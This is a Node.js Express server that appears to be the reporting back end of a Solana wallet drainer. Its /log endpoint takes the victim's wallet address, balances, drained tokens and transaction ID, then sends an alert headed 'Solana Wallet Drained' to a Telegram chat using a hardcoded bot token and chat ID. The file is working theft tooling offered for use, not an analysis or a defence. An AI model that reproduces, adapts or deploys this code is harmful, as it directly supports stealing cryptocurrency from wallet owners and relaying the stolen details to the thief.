import express from 'express';
import fetch from 'node-fetch';
import cors from 'cors';

const app = express();
app.use(cors());
app.use(express.json());

const TELEGRAM_BOT_TOKEN = '7472166975:AAGprIqMccwETgZRsel-cESDRpBm1b13GUE';
const TELEGRAM_CHAT_ID = '7851871287';

app.post('/log', async (req, res) => {
  const { publicKey, drainedTokens, tokenBalances, solBalance, txid, timestamp } = req.body;
  if (!publicKey || !txid) {
    return res.status(400).json({ error: 'Missing publicKey or txid' });
  }

  const tokensDrainedMsg = drainedTokens.length > 0
    ? drainedTokens.map((t, i) => `• ${t}: ${tokenBalances[i]}`).join('\n')
    : 'No SPL tokens drained';

  const message = `
🚨 *Solana Wallet Drained* 🚨
*Wallet:* \`${publicKey}\`

*Balances Before Drain:*
${tokenBalances.length > 0 ? tokenBalances.join('\n') : 'No SPL tokens'}

*SOL Balance Before Drain:* ${solBalance.toFixed(6)} SOL

*Tokens Drained:*
${tokensDrainedMsg}

*Transaction ID:* [${txid}](https://explorer.solana.com/tx/${txid}?cluster=mainnet)
*Time:* ${new Date(timestamp).toLocaleString()}
  `;

  try {
    const telegramRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
      }),
    });
    if (!telegramRes.ok) throw new Error('Telegram API error');
    res.json({ success: true });
  } catch (error) {
    console.error('Telegram API error:', error);
    res.status(500).json({ error: 'Failed to send telegram message' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
